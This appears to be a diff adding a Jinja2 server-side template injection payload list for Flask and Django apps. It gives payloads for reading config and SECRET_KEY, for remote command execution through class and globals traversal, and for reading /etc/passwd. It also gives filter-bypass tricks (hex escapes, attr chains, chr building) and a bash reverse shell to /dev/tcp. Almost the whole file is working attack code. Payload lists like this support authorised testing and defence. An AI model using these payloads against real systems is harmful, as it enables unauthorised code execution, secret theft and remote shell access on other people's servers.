@@ -1,0 +1,40 @@
+# Jinja2 (Python) - Flask, Django
+
+# Read config
+{{config}}
+{{config.items()}}
+{{config['SECRET_KEY']}}
+{{request.environ}}
+
+# RCE via MRO (Method Resolution Order)
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__base__.__subclasses__()}}
+
+# Find subprocess.Popen index (usually ~400+)
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='Popen' %}{{c}}{% endif %}{% endfor %}
+
+# Classic RCE payloads
+{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+
+# File read
+{{''.__class__.__mro__[1].__subclasses__()[XXX]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
+
+# Bypass filters - no underscore
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
+{{request['__class__']}}
+{{request["\x5f\x5fclass\x5f\x5f"]}}
+
+# Bypass filters - no brackets
+{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
+
+# Bypass filters - no quotes
+{% set chr=[].__class__.__base__.__subclasses__()[X].__init__.__globals__.__builtins__.chr %}{{chr(99)~chr(97)~chr(116)}}
+
+# Reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read()}}
